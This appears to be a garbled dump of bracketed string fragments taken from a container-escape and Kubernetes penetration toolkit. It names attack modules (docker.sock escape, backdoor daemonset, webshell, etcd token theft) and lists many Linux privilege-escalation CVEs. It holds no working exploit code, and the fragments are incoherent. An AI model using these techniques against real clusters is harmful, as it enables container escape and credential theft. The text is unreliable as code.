+"[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:25Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:27Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:27Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:25Z""}"
+"[{""weight"":1,""preference"":{""matchExpressions"":[{""key"":""node-role.kubernetes.io/master"",""operator"":""Exists""}"
+"[{""weight"":100,""podAffinityTerm"":{""labelSelector"":{""matchExpressions"":[{""key"":""app"",""operator"":""In"",""values"":[""ingress-nginx"""
+"[{""weight"":100,""podAffinityTerm"":{""labelSelector"":{""matchExpressions"":[{""key"":""k8s-app"",""operator"":""In"",""values"":[""kube-dns"""
+"[{\""image\"":\""ubuntu:latest\"",\""name\"":\""container\""}"
+[   ${txtgray}N/A${txtrst}    
+[ $? != 0 
+[ $AVAILABLE_PASSED_REQ -eq $AVAILABLE_REQS_NUM -a $ENABLE_PASSED_REQ -eq $ENABLE_REQS_NUM 
+[ $MODE -eq 3 
+[ $MODE -eq 4 
+[ $PASSED_REQ -eq $REQS_NUM 
+[ $cmdStdout -eq 0 
+[ $retVal -eq 0 
+[ $retVal -eq 2 
+[ $tag_distro=$tag_distro_num 
+[ ${TAG} 
+[ ${txtgray}Unknown${txtrst}  
+[ ${txtgrn}Enabled${txtrst}  
+[ ${txtgrn}Enabled${txtrst}   
+[ ${txtgrn}Locked${txtrst}   
+[ ${txtgrn}Set to $cmdStdout${txtrst} 
+[ ${txtred}Disabled${txtrst} 
+[ ${txtred}Exposed${txtrst}  
+[ ${txtred}Set to $cmdStdout${txtrst} 
+[ -S /run/snapd.socket 
+[ -f /proc/config.gz 
+[ -f /usr/sbin/getenforce 
+[ -u /usr/bin/Xorg 
+[ -u /usr/bin/newgidmap 
+[ -u /usr/bin/newuidmap 
+[ -u /usr/local/Serv-U/Serv-U 
+[ -u /usr/local/sbin/maidag 
+[ -x /etc/init.d/wftpserver 
+[ -x /usr/bin/equery 
+[ 10001
+[!
+[![404tk
+[![kingkaki
+[![lazydog
+[![wywwzjj
+[%s
+['$SECRET_PARAM'
+['/api/v1'
+['/tmp/auto-priv-cgroup'
+['/tmp/auto-shimpwn'
+['AKIA99999999999999AB'
+['CDK auto exploit via docker.sock'
+['CDK auto exploit via mounted device in privileged container'
+['Containers'
+['ContainersRunning'
+['Invalid IP Range'
+['SYS_PTRACE capability was disabled'
+['Usage'
+['apiVersion'
+['cdk '
+['cdk-backdoor-daemonset'
+['docker-api-pwn'
+['docker-sock-pwn'
+['finished with output'
+['forbidden this request'
+['i@cdxy.me'
+['input arg'
+['input args'
+['invalid input args'
+['invalid'
+['listening insecure-port: 0.0.0.0:9443'
+['no such file or directory'
+['options'
+['scanning'
+['selfLink'
+['test-poc'
+['the shell is not in a istio'
+['to K8s api-server'
+['webshell saved in'
+[((n++))
+[*
+[+
+[-
+[-----BEGIN RSA PRIVATE KEY-----
+[--full
+[-A-Za-z0-9_.
+[-\+
+[-l
+[-n tcp
+[-p port
+[-v
+[.*\
+[.subtype
+[0
+[0-9
+[0-9A-F
+[0-9a-f
+[0-9a-fA-F
+[0-9a-zA-Z
+[1
+[1:
+[2
+[2:
+[3
+[4
+[404tk
+[5
+[6:len(raw)-5
+[7
+[8:len(raw)-5
+[9:
+[:
+[:1000
+[:m
+[:relIdx
+[<args>...
+[<data>
+[<post_data>
+[@
+[A-Fa-f0-9
+[A-Z0-9
+[A-Za-z0-9
+[AKIA99999999999999AB
+[Auto Escape - Deploy K8s Backdoor Daemonset
+[Auto Escape - K8s API Server
+[Auto Escape - Privileged Container
+[Auto Escape - Shared Net Namespace
+[Auto Escape - docker.sock
+[CDK: Also a Awesome BugBounty Tool for Cloud Platform
+[CVE-2004-0077
+[CVE-2004-0186
+[CVE-2004-1235
+[CVE-2006-2451
+[CVE-2006-3626
+[CVE-2008-0600
+[CVE-2008-4210
+[CVE-2009-1185
+[CVE-2009-2692
+[CVE-2009-2698
+[CVE-2009-3547
+[CVE-2010-0832
+[CVE-2010-1146
+[CVE-2010-2959
+[CVE-2010-3081
+[CVE-2010-3301
+[CVE-2010-3437
+[CVE-2010-3904
+[CVE-2010-4170
+[CVE-2010-4347
+[CVE-2011-1485
+[CVE-2011-2921
+[CVE-2012-0056
+[CVE-2012-0809
+[CVE-2013-0268
+[CVE-2013-1858
+[CVE-2013-1959
+[CVE-2013-2094
+[CVE-2014-0038
+[CVE-2014-0196
+[CVE-2014-0476
+[CVE-2014-2851
+[CVE-2014-4014
+[CVE-2014-4699
+[CVE-2014-4943
+[CVE-2014-5119
+[CVE-2014-5207
+[CVE-2015-1318
+[CVE-2015-1328
+[CVE-2015-1815
+[CVE-2015-1862
+[CVE-2015-3202
+[CVE-2015-3246
+[CVE-2015-3290
+[CVE-2015-3315
+[CVE-2015-5287
+[CVE-2015-6565
+[CVE-2015-8612
+[CVE-2015-8660
+[CVE-2015-9322
+[CVE-2016-0728
+[CVE-2016-1240
+[CVE-2016-1247
+[CVE-2016-1531
+[CVE-2016-2384
+[CVE-2016-4557
+[CVE-2016-4989
+[CVE-2016-4997
+[CVE-2016-5195
+[CVE-2016-5425
+[CVE-2016-8655
+[CVE-2016-9566
+[CVE-2016-9793
+[CVE-2017-0358
+[CVE-2017-1000112
+[CVE-2017-1000253
+[CVE-2017-1000367
+[CVE-2017-16995
+[CVE-2017-5618
+[CVE-2017-5899
+[CVE-2017-6074
+[CVE-2017-7308
+[CVE-2018-1000001
+[CVE-2018-10900
+[CVE-2018-14665
+[CVE-2018-18955
+[CVE-2018-5333
+[CVE-2019-10149
+[CVE-2019-12181
+[CVE-2019-13272
+[CVE-2019-15666
+[CVE-2019-18634
+[CVE-2019-18862
+[CVE-2019-7304
+[CVE-2020-9470
+[CVE-2021-22555
+[CVE-2021-27365
+[CVE-2021-3156
+[CVE-2021-3490
+[CVE-2021-4034
+[CVE-2022-0847
+[Contributors List
+[DEBUG
+[ECS
+[ERROR
+[GitHub Discussions
+[GitHub Issues
+[INFO_
+[Information Gathering - Cgroups
+[Information Gathering - Mounts
+[Information Gathering - SIDs
+[Information Gathering - System Info
+[K8s Pod
+[Local
+[N/A
+[OPTIONS
+[Release Document
+[SKaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+[Selfbuild k8s master node
+[Starlink Project 2.0
+[TEST
+[WARN_
+[[ $1 == $2 
+[[ -f /etc/udev/rules.d/95-udev-late.rules || -f /lib/udev/rules.d/95-udev-late.rules 
+[[ -z ${ver2[i
+[[0-9;
+[[^\
+[\+-
+[\.0-9\+:p
+[\._
+[\\w
+[\\w-
+[\\w\\.-
+[\s\:
+[\s\S
+[\w\d\/-
+[][
+[]string) [
+[]string)[0
+[^/ 
+[^/\\s:@
+[^0-9.
+[^:
+[^\\n
+[_
+[_POSIX_ACL
+[_POSIX_CHOWN_RESTRICTED
+[a-z0-9
+[a-zA-Z
+[a-zA-Z0-9-_
+[a-zA-Z0-9_
+[alpine:latest
+[a|A
+[b|B
+[compile and upload
+[c|C
+[etcd-get-k8s-token
+[etcd-get-token
+[example
+[e|E
+[field
+[f|F
+[g|G
+[host
+[http://kcon.knownsec.com/2021/#/arsenal
+[https://community.cncf.io/events/details/cncf-kcd-china-presents-kubernetes-community-days-china/
+[https://github.com/knownsec/404StarLink2.0-Galaxy#community
+[https://www.blackhat.com/asia-21/arsenal/schedule/index.html#cdk-zero-dependency-container-penetration-toolkit-22422
+[h|H
+[i
+[idx
+[inside container
+[item
+[i|I
+[j
+[k
+[kingkaki
+[k|K
+[l:n
+[lazydog
+[link
+[my
+[name
+[name of copyright owner
+[normal exit/fatal
+[options
+[o|O
+[pid
+[png
+[p|P
+[p|b|o|a
+[run test in container.
+[r|R
+[sockname
+[string
+[string(name)
+[subsystem-name
+[s|S
+[test
+[true/false
+[t|T
+[ubuntu:latest
+[upload
+[upload to host
+[u|U
+[wywwzjj
+[w|W
+[yyyy
+[y|Y
+[{}
